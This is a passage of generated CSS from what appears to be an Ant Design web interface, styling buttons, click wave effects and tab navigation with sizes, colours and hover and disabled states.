    .css-1ymq82w[class^="ant-btn"]::before,
    .css-1ymq82w[class*=" ant-btn"]::before,
    .css-1ymq82w[class^="ant-btn"]::after,
    .css-1ymq82w[class*=" ant-btn"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-btn"] [class^="ant-btn"],
    .css-1ymq82w[class*=" ant-btn"] [class^="ant-btn"],
    .css-1ymq82w[class^="ant-btn"] [class*=" ant-btn"],
    .css-1ymq82w[class*=" ant-btn"] [class*=" ant-btn"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-btn"] [class^="ant-btn"]::before,
    .css-1ymq82w[class*=" ant-btn"] [class^="ant-btn"]::before,
    .css-1ymq82w[class^="ant-btn"] [class*=" ant-btn"]::before,
    .css-1ymq82w[class*=" ant-btn"] [class*=" ant-btn"]::before,
    .css-1ymq82w[class^="ant-btn"] [class^="ant-btn"]::after,
    .css-1ymq82w[class*=" ant-btn"] [class^="ant-btn"]::after,
    .css-1ymq82w[class^="ant-btn"] [class*=" ant-btn"]::after,
    .css-1ymq82w[class*=" ant-btn"] [class*=" ant-btn"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-btn {
        outline: none;
        position: relative;
        display: inline-block;
        font-weight: 400;
        white-space: nowrap;
        text-align: center;
        background-image: none;
        background-color: transparent;
        border: 1px solid transparent;
        cursor: pointer;
        transition: all 0.2s cubic-bezier(0.645, 0.045, 0.355, 1);
        user-select: none;
        touch-action: manipulation;
        line-height: 1.5714285714285714;
        color: rgba(0, 0, 0, 0.88);
    }

    .css-1ymq82w.ant-btn>span {
        display: inline-block;
    }

    .css-1ymq82w.ant-btn>.anticon+span,
    .css-1ymq82w.ant-btn>span+.anticon {
        margin-left: 8px;
    }

    .css-1ymq82w.ant-btn:not(:disabled):focus-visible {
        outline: 4px solid #91caff;
        outline-offset: 1px;
        transition: outline-offset 0s, outline 0s;
    }

    .css-1ymq82w.ant-btn-icon-only.css-1ymq82w.ant-btn-compact-item {
        flex: none;
    }

    .css-1ymq82w.ant-btn-compact-item.ant-btn-primary:not([disabled])+.css-1ymq82w.ant-btn-compact-item.ant-btn-primary:not([disabled]) {
        position: relative;
    }

    .css-1ymq82w.ant-btn-compact-item.ant-btn-primary:not([disabled])+.css-1ymq82w.ant-btn-compact-item.ant-btn-primary:not([disabled]):before {
        position: absolute;
        top: -1px;
        left: -1px;
        display: inline-block;
        width: 1px;
        height: calc(100% + 2px);
        background-color: #4096ff;
        content: "";
    }

    .css-1ymq82w.ant-btn-compact-vertical-item.ant-btn-primary:not([disabled])+.css-1ymq82w.ant-btn-compact-vertical-item.ant-btn-primary:not([disabled]) {
        position: relative;
    }

    .css-1ymq82w.ant-btn-compact-vertical-item.ant-btn-primary:not([disabled])+.css-1ymq82w.ant-btn-compact-vertical-item.ant-btn-primary:not([disabled]):before {
        position: absolute;
        top: -1px;
        left: -1px;
        display: inline-block;
        width: calc(100% + 2px);
        height: 1px;
        background-color: #4096ff;
        content: "";
    }

    .css-1ymq82w.ant-btn.ant-btn-sm {
        font-size: 14px;
        height: 24px;
        padding: 0px 7px;
        border-radius: 4px;
    }

    .css-1ymq82w.ant-btn.ant-btn-sm.ant-btn-icon-only {
        width: 24px;
        padding-left: 0;
        padding-right: 0;
    }

    .css-1ymq82w.ant-btn.ant-btn-sm.ant-btn-icon-only.ant-btn-round {
        width: auto;
    }

    .css-1ymq82w.ant-btn.ant-btn-sm.ant-btn-icon-only>span {
        transform: scale(1.143);
    }

    .css-1ymq82w.ant-btn.ant-btn-sm.ant-btn-loading {
        opacity: 0.65;
        cursor: default;
    }

    .css-1ymq82w.ant-btn.ant-btn-sm .ant-btn-loading-icon {
        transition: width 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    .css-1ymq82w.ant-btn.ant-btn-sm:not(.ant-btn-icon-only) .ant-btn-loading-icon>.anticon {
        margin-right: 8px;
    }

    .css-1ymq82w.ant-btn.ant-btn-circle.ant-btn-sm {
        min-width: 24px;
        padding-left: 0;
        padding-right: 0;
        border-radius: 50%;
    }

    .css-1ymq82w.ant-btn.ant-btn-round.ant-btn-sm {
        border-radius: 24px;
        padding-left: 12px;
        padding-right: 12px;
    }

    .css-1ymq82w.ant-btn {
        font-size: 14px;
        height: 32px;
        padding: 4px 15px;
        border-radius: 6px;
    }

    .css-1ymq82w.ant-btn.ant-btn-icon-only {
        width: 32px;
        padding-left: 0;
        padding-right: 0;
    }

    .css-1ymq82w.ant-btn.ant-btn-icon-only.ant-btn-round {
        width: auto;
    }

    .css-1ymq82w.ant-btn.ant-btn-icon-only>span {
        transform: scale(1.143);
    }

    .css-1ymq82w.ant-btn.ant-btn-loading {
        opacity: 0.65;
        cursor: default;
    }

    .css-1ymq82w.ant-btn .ant-btn-loading-icon {
        transition: width 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    .css-1ymq82w.ant-btn:not(.ant-btn-icon-only) .ant-btn-loading-icon>.anticon {
        margin-right: 8px;
    }

    .css-1ymq82w.ant-btn.ant-btn-circle {
        min-width: 32px;
        padding-left: 0;
        padding-right: 0;
        border-radius: 50%;
    }

    .css-1ymq82w.ant-btn.ant-btn-round {
        border-radius: 32px;
        padding-left: 16px;
        padding-right: 16px;
    }

    .css-1ymq82w.ant-btn.ant-btn-lg {
        font-size: 16px;
        height: 40px;
        padding: 6.428571428571429px 15px;
        border-radius: 8px;
    }

    .css-1ymq82w.ant-btn.ant-btn-lg.ant-btn-icon-only {
        width: 40px;
        padding-left: 0;
        padding-right: 0;
    }

    .css-1ymq82w.ant-btn.ant-btn-lg.ant-btn-icon-only.ant-btn-round {
        width: auto;
    }

    .css-1ymq82w.ant-btn.ant-btn-lg.ant-btn-icon-only>span {
        transform: scale(1.143);
    }

    .css-1ymq82w.ant-btn.ant-btn-lg.ant-btn-loading {
        opacity: 0.65;
        cursor: default;
    }

    .css-1ymq82w.ant-btn.ant-btn-lg .ant-btn-loading-icon {
        transition: width 0.3s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.3s cubic-bezier(0.645, 0.045, 0.355, 1);
    }

    .css-1ymq82w.ant-btn.ant-btn-lg:not(.ant-btn-icon-only) .ant-btn-loading-icon>.anticon {
        margin-right: 8px;
    }

    .css-1ymq82w.ant-btn.ant-btn-circle.ant-btn-lg {
        min-width: 40px;
        padding-left: 0;
        padding-right: 0;
        border-radius: 50%;
    }

    .css-1ymq82w.ant-btn.ant-btn-round.ant-btn-lg {
        border-radius: 40px;
        padding-left: 20px;
        padding-right: 20px;
    }

    .css-1ymq82w.ant-btn.ant-btn-block {
        width: 100%;
    }

    .css-1ymq82w.ant-btn-default {
        background-color: #ffffff;
        border-color: #d9d9d9;
        box-shadow: 0 2px 0 rgba(0, 0, 0, 0.02);
    }

    .css-1ymq82w.ant-btn-default:disabled {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-default:not(:disabled):hover {
        color: #4096ff;
        border-color: #4096ff;
    }

    .css-1ymq82w.ant-btn-default:not(:disabled):active {
        color: #0958d9;
        border-color: #0958d9;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-background-ghost {
        color: #ffffff;
        background-color: transparent;
        border-color: #ffffff;
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-background-ghost:not(:disabled):hover {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-background-ghost:not(:disabled):active {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-background-ghost:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
        border-color: #d9d9d9;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous {
        color: #ff4d4f;
        border-color: #ff4d4f;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous:not(:disabled):hover {
        color: #ff7875;
        border-color: #ffa39e;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous:not(:disabled):active {
        color: #d9363e;
        border-color: #d9363e;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost {
        color: #ff4d4f;
        background-color: transparent;
        border-color: #ff4d4f;
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):hover {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):active {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous.ant-btn-background-ghost:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
        border-color: #d9d9d9;
    }

    .css-1ymq82w.ant-btn-default.ant-btn-dangerous:disabled {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-primary {
        color: #fff;
        background-color: #1677ff;
        box-shadow: 0 2px 0 rgba(5, 145, 255, 0.1);
    }

    .css-1ymq82w.ant-btn-primary:disabled {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-primary:not(:disabled):hover {
        color: #fff;
        background-color: #4096ff;
    }

    .css-1ymq82w.ant-btn-primary:not(:disabled):active {
        color: #fff;
        background-color: #0958d9;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-background-ghost {
        color: #1677ff;
        background-color: transparent;
        border-color: #1677ff;
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-background-ghost:not(:disabled):hover {
        background-color: transparent;
        color: #4096ff;
        border-color: #4096ff;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-background-ghost:not(:disabled):active {
        background-color: transparent;
        color: #0958d9;
        border-color: #0958d9;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-background-ghost:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
        border-color: #d9d9d9;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous {
        background-color: #ff4d4f;
        box-shadow: 0 2px 0 rgba(255, 38, 5, 0.06);
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous:not(:disabled):hover {
        background-color: #ff7875;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous:not(:disabled):active {
        background-color: #d9363e;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost {
        color: #ff4d4f;
        background-color: transparent;
        border-color: #ff4d4f;
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):hover {
        background-color: transparent;
        color: #ff7875;
        border-color: #ff7875;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):active {
        background-color: transparent;
        color: #d9363e;
        border-color: #d9363e;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous.ant-btn-background-ghost:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
        border-color: #d9d9d9;
    }

    .css-1ymq82w.ant-btn-primary.ant-btn-dangerous:disabled {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-dashed {
        background-color: #ffffff;
        border-color: #d9d9d9;
        box-shadow: 0 2px 0 rgba(0, 0, 0, 0.02);
        border-style: dashed;
    }

    .css-1ymq82w.ant-btn-dashed:disabled {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-dashed:not(:disabled):hover {
        color: #4096ff;
        border-color: #4096ff;
    }

    .css-1ymq82w.ant-btn-dashed:not(:disabled):active {
        color: #0958d9;
        border-color: #0958d9;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-background-ghost {
        color: #ffffff;
        background-color: transparent;
        border-color: #ffffff;
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-background-ghost:not(:disabled):hover {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-background-ghost:not(:disabled):active {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-background-ghost:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
        border-color: #d9d9d9;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous {
        color: #ff4d4f;
        border-color: #ff4d4f;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous:not(:disabled):hover {
        color: #ff7875;
        border-color: #ffa39e;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous:not(:disabled):active {
        color: #d9363e;
        border-color: #d9363e;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost {
        color: #ff4d4f;
        background-color: transparent;
        border-color: #ff4d4f;
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):hover {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost:not(:disabled):active {
        background-color: transparent;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous.ant-btn-background-ghost:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
        border-color: #d9d9d9;
    }

    .css-1ymq82w.ant-btn-dashed.ant-btn-dangerous:disabled {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-link {
        color: #1677ff;
    }

    .css-1ymq82w.ant-btn-link:not(:disabled):hover {
        color: #69b1ff;
    }

    .css-1ymq82w.ant-btn-link:not(:disabled):active {
        color: #0958d9;
    }

    .css-1ymq82w.ant-btn-link:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
    }

    .css-1ymq82w.ant-btn-link.ant-btn-dangerous {
        color: #ff4d4f;
    }

    .css-1ymq82w.ant-btn-link.ant-btn-dangerous:not(:disabled):hover {
        color: #ff7875;
    }

    .css-1ymq82w.ant-btn-link.ant-btn-dangerous:not(:disabled):active {
        color: #d9363e;
    }

    .css-1ymq82w.ant-btn-link.ant-btn-dangerous:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
    }

    .css-1ymq82w.ant-btn-text:not(:disabled):hover {
        color: rgba(0, 0, 0, 0.88);
        background-color: rgba(0, 0, 0, 0.06);
    }

    .css-1ymq82w.ant-btn-text:not(:disabled):active {
        color: rgba(0, 0, 0, 0.88);
        background-color: rgba(0, 0, 0, 0.15);
    }

    .css-1ymq82w.ant-btn-text:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
    }

    .css-1ymq82w.ant-btn-text.ant-btn-dangerous {
        color: #ff4d4f;
    }

    .css-1ymq82w.ant-btn-text.ant-btn-dangerous:disabled {
        cursor: not-allowed;
        color: rgba(0, 0, 0, 0.25);
    }

    .css-1ymq82w.ant-btn-text.ant-btn-dangerous:not(:disabled):hover {
        color: #ff7875;
        background-color: #fff2f0;
    }

    .css-1ymq82w.ant-btn-text.ant-btn-dangerous:not(:disabled):active {
        color: #ff7875;
        background-color: #fff2f0;
    }

    .css-1ymq82w.ant-btn-disabled {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-disabled.ant-btn:hover {
        cursor: not-allowed;
        border-color: #d9d9d9;
        color: rgba(0, 0, 0, 0.25);
        background-color: rgba(0, 0, 0, 0.04);
        box-shadow: none;
    }

    .css-1ymq82w.ant-btn-group {
        position: relative;
        display: inline-flex;
    }

    .css-1ymq82w.ant-btn-group>span:not(:last-child),
    .css-1ymq82w.ant-btn-group>.ant-btn:not(:last-child),
    .css-1ymq82w.ant-btn-group>span:not(:last-child)>.ant-btn,
    .css-1ymq82w.ant-btn-group>.ant-btn:not(:last-child)>.ant-btn {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }

    .css-1ymq82w.ant-btn-group>span:not(:first-child),
    .css-1ymq82w.ant-btn-group>.ant-btn:not(:first-child) {
        margin-left: -1px;
    }

    .css-1ymq82w.ant-btn-group>span:not(:first-child),
    .css-1ymq82w.ant-btn-group>.ant-btn:not(:first-child),
    .css-1ymq82w.ant-btn-group>span:not(:first-child)>.ant-btn,
    .css-1ymq82w.ant-btn-group>.ant-btn:not(:first-child)>.ant-btn {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-btn-group .ant-btn {
        position: relative;
        z-index: 1;
    }

    .css-1ymq82w.ant-btn-group .ant-btn:hover,
    .css-1ymq82w.ant-btn-group .ant-btn:focus,
    .css-1ymq82w.ant-btn-group .ant-btn:active {
        z-index: 2;
    }

    .css-1ymq82w.ant-btn-group .ant-btn[disabled] {
        z-index: 0;
    }

    .css-1ymq82w.ant-btn-group .ant-btn-icon-only {
        font-size: 14px;
    }

    .css-1ymq82w.ant-btn-group>span:not(:last-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-primary:not(:last-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>span:not(:last-child)>.ant-btn-primary:not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-primary:not(:last-child)>.ant-btn-primary:not(:disabled) {
        border-right-color: #4096ff;
    }

    .css-1ymq82w.ant-btn-group>span:not(:first-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-primary:not(:first-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>span:not(:first-child)>.ant-btn-primary:not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-primary:not(:first-child)>.ant-btn-primary:not(:disabled) {
        border-left-color: #4096ff;
    }

    .css-1ymq82w.ant-btn-group>span:not(:last-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-danger:not(:last-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>span:not(:last-child)>.ant-btn-danger:not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-danger:not(:last-child)>.ant-btn-danger:not(:disabled) {
        border-right-color: #ff7875;
    }

    .css-1ymq82w.ant-btn-group>span:not(:first-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-danger:not(:first-child):not(:disabled),
    .css-1ymq82w.ant-btn-group>span:not(:first-child)>.ant-btn-danger:not(:disabled),
    .css-1ymq82w.ant-btn-group>.ant-btn-danger:not(:first-child)>.ant-btn-danger:not(:disabled) {
        border-left-color: #ff7875;
    }

    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-last-item) {
        margin-right: -1px;
    }

    .css-1ymq82w.ant-btn-compact-item:hover,
    .css-1ymq82w.ant-btn-compact-item:active {
        z-index: 2;
    }

    .css-1ymq82w.ant-btn-compact-item[disabled] {
        z-index: 0;
    }

    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-first-item):not(.css-1ymq82w.ant-btn-compact-last-item) {
        border-radius: 0;
    }

    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-last-item).css-1ymq82w.ant-btn-compact-first-item,
    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-last-item).css-1ymq82w.ant-btn-compact-first-item.ant-btn-sm,
    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-last-item).css-1ymq82w.ant-btn-compact-first-item.ant-btn-lg {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0;
    }

    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-first-item).css-1ymq82w.ant-btn-compact-last-item,
    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-first-item).css-1ymq82w.ant-btn-compact-last-item.ant-btn-sm,
    .css-1ymq82w.ant-btn-compact-item:not(.css-1ymq82w.ant-btn-compact-first-item).css-1ymq82w.ant-btn-compact-last-item.ant-btn-lg {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-btn-compact-vertical-item:not(.css-1ymq82w.ant-btn-compact-vertical-last-item) {
        margin-bottom: -1px;
    }

    .css-1ymq82w.ant-btn-compact-vertical-item:hover,
    .css-1ymq82w.ant-btn-compact-vertical-item:focus,
    .css-1ymq82w.ant-btn-compact-vertical-item:active {
        z-index: 2;
    }

    .css-1ymq82w.ant-btn-compact-vertical-item[disabled] {
        z-index: 0;
    }

    .css-1ymq82w.ant-btn-compact-vertical-item:not(.css-1ymq82w.ant-btn-compact-vertical-first-item):not(.css-1ymq82w.ant-btn-compact-vertical-last-item) {
        border-radius: 0;
    }

    .css-1ymq82w.ant-btn-compact-vertical-item.css-1ymq82w.ant-btn-compact-vertical-first-item:not(.css-1ymq82w.ant-btn-compact-vertical-last-item),
    .css-1ymq82w.ant-btn-compact-vertical-item.css-1ymq82w.ant-btn-compact-vertical-first-item:not(.css-1ymq82w.ant-btn-compact-vertical-last-item).ant-btn-sm,
    .css-1ymq82w.ant-btn-compact-vertical-item.css-1ymq82w.ant-btn-compact-vertical-first-item:not(.css-1ymq82w.ant-btn-compact-vertical-last-item).ant-btn-lg {
        border-bottom-right-radius: 0;
        border-bottom-left-radius: 0;
    }

    .css-1ymq82w.ant-btn-compact-vertical-item.css-1ymq82w.ant-btn-compact-vertical-last-item:not(.css-1ymq82w.ant-btn-compact-vertical-first-item),
    .css-1ymq82w.ant-btn-compact-vertical-item.css-1ymq82w.ant-btn-compact-vertical-last-item:not(.css-1ymq82w.ant-btn-compact-vertical-first-item).ant-btn-sm,
    .css-1ymq82w.ant-btn-compact-vertical-item.css-1ymq82w.ant-btn-compact-vertical-last-item:not(.css-1ymq82w.ant-btn-compact-vertical-first-item).ant-btn-lg {
        border-top-left-radius: 0;
        border-top-right-radius: 0;
    }
</style>
<style>
    .css-1ymq82w[class^="ant-wave"],
    .css-1ymq82w[class*=" ant-wave"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-wave"]::before,
    .css-1ymq82w[class*=" ant-wave"]::before,
    .css-1ymq82w[class^="ant-wave"]::after,
    .css-1ymq82w[class*=" ant-wave"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-wave"] [class^="ant-wave"],
    .css-1ymq82w[class*=" ant-wave"] [class^="ant-wave"],
    .css-1ymq82w[class^="ant-wave"] [class*=" ant-wave"],
    .css-1ymq82w[class*=" ant-wave"] [class*=" ant-wave"] {
        box-sizing: border-box;
    }

    .css-1ymq82w[class^="ant-wave"] [class^="ant-wave"]::before,
    .css-1ymq82w[class*=" ant-wave"] [class^="ant-wave"]::before,
    .css-1ymq82w[class^="ant-wave"] [class*=" ant-wave"]::before,
    .css-1ymq82w[class*=" ant-wave"] [class*=" ant-wave"]::before,
    .css-1ymq82w[class^="ant-wave"] [class^="ant-wave"]::after,
    .css-1ymq82w[class*=" ant-wave"] [class^="ant-wave"]::after,
    .css-1ymq82w[class^="ant-wave"] [class*=" ant-wave"]::after,
    .css-1ymq82w[class*=" ant-wave"] [class*=" ant-wave"]::after {
        box-sizing: border-box;
    }

    .css-1ymq82w.ant-wave {
        position: absolute;
        background: transparent;
        pointer-events: none;
        box-sizing: border-box;
        color: var(--wave-color, #1677ff);
        box-shadow: 0 0 0 0 currentcolor;
        opacity: 0.2;
    }

    .css-1ymq82w.ant-wave.wave-motion-appear {
        transition: box-shadow 0.4s cubic-bezier(0.08, 0.82, 0.17, 1), opacity 2s cubic-bezier(0.08, 0.82, 0.17, 1);
    }

    .css-1ymq82w.ant-wave.wave-motion-appear-active {
        box-shadow: 0 0 0 6px currentcolor;
        opacity: 0;
    }
</style>




<style>
    .dxtxfQ.dxtxfQ {
        flex: 1 1 auto;
        width: 100%;
        height: 0px;
    }

    .css-1ymq82w.ant-tabs {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        display: flex;
    }

    .dxtxfQ.dxtxfQ .ant-tabs-nav {
        width: 100%;
        height: 58px;
        margin: 0px !important;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav {
        position: relative;
        display: flex;
        flex: none;
        align-items: center;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap {
        position: relative;
        display: flex;
        flex: auto;
        align-self: stretch;
        overflow: hidden;
        white-space: nowrap;
        transform: translate(0);
    }

    .dxtxfQ.dxtxfQ .ant-tabs-nav .ant-tabs-nav-wrap .ant-tabs-nav-list {
        display: flex;
        width: 100%;
        -webkit-box-pack: center;
        justify-content: center;
        -webkit-box-align: center;
        align-items: center;
        margin: 0px;
        padding: 0px;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap::before,
    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap::after {
        position: absolute;
        z-index: 1;
        opacity: 0;
        transition: opacity 0.3s;
        content: '';
        pointer-events: none;
    }

    .css-1ymq82w.ant-tabs-top>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-bottom>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-top>div>.ant-tabs-nav .ant-tabs-nav-wrap::after,
    .css-1ymq82w.ant-tabs-bottom>div>.ant-tabs-nav .ant-tabs-nav-wrap::after {
        right: 0;
        box-shadow: inset -10px 0 8px -8px rgba(0, 0, 0, 0.08);
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-wrap,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-wrap {
        position: relative;
        display: flex;
        flex: auto;
        align-self: stretch;
        overflow: hidden;
        white-space: nowrap;
        transform: translate(0);
    }

    .css-1ymq82w[class^="ant-tabs"] [class^="ant-tabs"],
    .css-1ymq82w[class*=" ant-tabs"] [class^="ant-tabs"],
    .css-1ymq82w[class^="ant-tabs"] [class*=" ant-tabs"],
    .css-1ymq82w[class*=" ant-tabs"] [class*=" ant-tabs"] {
        box-sizing: border-box;
    }

    div {
        display: block;
        unicode-bidi: isolate;
    }

    .css-1ymq82w.ant-tabs {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        color: rgba(0, 0, 0, 0.88);
        font-size: 14px;
        line-height: 1.5714285714285714;
        list-style: none;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        display: flex;
    }

    .css-1ymq82w[class^="ant-tabs"],
    .css-1ymq82w[class*=" ant-tabs"] {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
        font-size: 14px;
        box-sizing: border-box;
    }

    .dxtxfQ.dxtxfQ .ant-tabs-nav .ant-tabs-nav-operations {
        display: none !important;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-operations-hidden,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-operations-hidden {
        position: absolute;
        visibility: hidden;
        pointer-events: none;
    }

    .css-1ymq82w.ant-tabs>.ant-tabs-nav .ant-tabs-nav-operations,
    .css-1ymq82w.ant-tabs>div>.ant-tabs-nav .ant-tabs-nav-operations {
        display: flex;
        align-self: stretch;
    }

    .dxtxfQ.dxtxfQ .ant-tabs-content-holder {
        display: flex;
    }

    .css-1ymq82w.ant-tabs .ant-tabs-content-holder {
        flex: auto;
        min-width: 0;
        min-height: 0;
    }

    .dxtxfQ.dxtxfQ .ant-tabs-content-holder .ant-tabs-content {
        width: 100%;
        flex: 1 1 auto;
    }

    .dxtxfQ.dxtxfQ .ant-tabs-content-holder .ant-tabs-content .ant-tabs-tabpane-active {
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
